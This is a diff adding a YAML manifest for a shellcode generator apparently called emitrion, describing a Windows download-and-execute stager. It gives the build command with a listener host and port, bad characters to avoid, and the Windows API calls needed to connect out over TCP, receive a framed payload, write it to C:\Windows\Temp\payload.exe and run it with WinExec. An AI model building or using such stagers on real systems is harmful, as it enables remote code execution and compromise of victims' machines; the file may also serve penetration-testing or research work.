@@ -1,0 +1,26 @@
+template: ir_tcp_download
+# IR workflow: TCP download to file and execute.
+# Downloads payload via TCP framing protocol, writes to disk, runs it.
+#
+# Protocol: [4 bytes LE size][raw file bytes]
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_tcp_download.yaml \
+#       --lhost 192.168.1.100 --lport 9001 \
+#       --dst "C:\\Windows\\Temp\\payload.exe" \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - WSAStartup
+  - WSASocketA
+  - connect
+  - recv
+  - closesocket
+  - VirtualAlloc
+  - CreateFileA
+  - WriteFile
+  - CloseHandle
+  - WinExec
+  - ExitProcess
